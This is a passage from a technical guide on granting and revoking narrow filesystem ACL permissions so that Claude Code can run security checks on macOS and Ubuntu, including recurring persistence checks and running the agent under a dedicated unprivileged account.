   sudo setfacl -x "u:${USER}" /etc/hosts
   ```

   macOS needs more care than the parallel command suggests.
   `chmod -a` subtracts the permissions you name from a matching entry, it doesn't delete the entry, and it exits `0` whether or not anything matched:

   ```shell
   sudo chmod -a "${USER} allow read" /etc/hosts
   ```

   Revoke a `read,write` grant with a string that only says `read`, and you've released read and kept write, silently, with a success exit code.
   Revoke by index instead, using the number `ls -le` already printed:

   ```shell
   sudo chmod -a# 0 /etc/hosts
   ```

   Or clear every entry on the file, which is normal when you're the only one who put ACLs on it:

   ```shell
   sudo chmod -N /etc/hosts
   ```

   Either way, confirm with `ls -le` afterward.
   The exit code won't tell you if it worked.
   The file will.

</Steps>

That asymmetry is most of the actual payoff, and it matters more for write grants than read ones.
Setting one up correctly, on the right file, can take real testing against the preceding gotchas.
Taking it away takes one line and a follow-up check, touches nothing else about the account or the service, and leaves you back exactly where you started before you asked Claude Code to look at anything.
That's the property that makes it reasonable to grant write access for a hardening session at all: you're never more than one command away from having granted nothing, as long as you check that it worked.

## A Recurring Check: Standing Read, Session Write

Everything covered so far is a session: grant read, diagnose, grant write narrowly, fix, revoke everything.
For a machine you keep using, the natural next step is a recurring check instead of a one-time pass, and that changes the shape of the grant, not just how often you run it.

**Read grants become standing.**
A weekly persistence diff is pointless if you have to re-grant read access every week to run it.
Read can't grant a new privilege, so a durable grant on the locations you're checking, LaunchAgents and LaunchDaemons on macOS, cron and systemd timers on Ubuntu, costs nothing to leave in place, and there's no revoke step to remember or forget.

**Write stays session-scoped, every time.**
A recurring check is read-only by design.
Write only enters the picture when a check finds something, and then it's the same rule as everywhere else in this guide: one file, one reviewed diff, revoke when you're done.
A standing check doesn't earn a standing write grant just because it runs on a schedule.

**Surface findings, don't auto-fix them.**
Even a file Claude Code could technically write without `sudo` should be shown to you, not corrected on its own.
A false positive on a persistence check is usually a legitimate app's own updater, installed the same week, and costs you one glance to rule out.
A false negative, something real that got corrected before you saw it, costs you the entire reason the check exists.

**Diff against a baseline, don't judge in isolation.**
Every check in a recurring pass should compare against what this looked like last time, not attempt to decide on its own whether something new is malicious.
That's also what makes standing read sufficient on its own: comparison needs no judgment call and no privilege beyond read.

A standing grant that quietly stops working is worse than no grant at all, because you keep believing the check is still running.
This is the ACL mask gotcha covered earlier, one level up: a service's own `chmod` on its config file zeroes the mask without touching the entry `getfacl` still lists.
Make the recurring check's first action a check of its own grants, before it checks anything else:

```shell
getfacl -p /var/log/some-log-that-should-be-standing | grep 'effective:---'
```

Any output means the grant has been masked off since the last run, and everything downstream of it in that check is reporting on nothing.
macOS has no mask, so the equivalent failure is simpler: the ACE from `ls -le` is either there or it isn't, and a standing grant only disappears if something explicitly removed it.

## A Dedicated Account for the Agent

A recurring check on your own account is still running as you, with a grant that's now permanent instead of session-length.
That's a reasonable place to stop for a single machine you check yourself.
It's also the point where a dedicated account for the agent starts paying for itself instead of just adding steps.

Running Claude Code as your own login user means its blast radius is everything you can read: your SSH keys, your dotfiles, your shell history, on top of whatever you've explicitly granted.
A dedicated, unprivileged account owns none of that.
It has its own home directory, no `sudo`, and ACLs that reach only the data it's actually been granted, not your SSH keys, not `/etc/shadow`, nothing outside what you gave it on purpose.
It's also immune to the cached-`sudo`-ticket problem by construction: with no `sudo` in the account's own picture at all, there's no ticket for it to inherit from a terminal you happened to authenticate in earlier.

Revocation is the clearest difference.
On your own account, revoking means finding and removing every ACL entry you've granted over time, scattered across however many files a standing practice has accumulated.
A dedicated account revokes with one command, deleting the account, and everything it could reach goes with it.

The isolation has to be enforced, not requested.
Telling Claude Code in a `CLAUDE.md` file to act like a different user is a suggestion, not a boundary.
The agent can misread it, forget it, or override it under contrary instructions in-session, and nothing catches it if that happens.
Only an actual account switch enforces anything: `sudo -u agent-account -i` for a local dedicated user, or an SSH alias pinned to a dedicated account's key for one running elsewhere.

This is real setup, not a config flag.
A local dedicated user needs the account created, its home directory locked down, a `sudoers.d` rule just so you can `sudo -u` into it, and, on Ubuntu, installing Claude Code through its package repository instead of the default curl installer, since that installer puts the binary in the *running* user's own `~/.local/bin`, not the dedicated account's.
Running it over SSH from a separate workstation adds a dedicated keypair and a second host alias on top of that, and installing the pubkey non-interactively, since the account is deliberately password-locked and `ssh-copy-id` can't work against it; that's the intended shape, not a gap to work around.
None of it is exotic, and Anthropic isn't building OS-level process isolation for you: a [feature request for exactly this](https://github.com/anthropics/claude-code/issues/41505) was closed as not planned, which makes a dedicated account the best available approach today, not a stopgap waiting on a fix that's coming.

Weigh it against what it's for.
A single diagnostic session on your own machine doesn't need any of this, the setup cost outweighs a benefit that only matters once a grant outlives one sitting.
A recurring check that's going to run every week for the life of the machine is exactly the case this setup was built for.

## The General Principle

Grant the narrowest capability that answers the question you're asking, for as long as you're asking it, and prefer "no credential exists" over "credential is well hidden."
Read broadly for diagnosis, because read access can't grant a new privilege, though the content it returns still deserves the same scrutiny as anything else you didn't write yourself.
Write narrowly for the fix, one file at a time, and check what reads that file before you grant it.
Revoke when the session's done.

Every one of the easy fixes covered earlier fails that test at the privilege stage.
The file that fails it at the *file* stage, `/etc/sudoers.d/`, a systemd unit, a root LaunchDaemon, is the one worth remembering: the account can retrieve more than the task needs, the same failure as passwordless `sudo`, just found in a single file instead of a blanket grant.
A standing check changes the schedule, not the rule: read stays broad because it can't make anything worse, write stays narrow and reviewed no matter how routine the check becomes, and a grant that's easy to set up is only worth keeping if it's just as easy to take away.
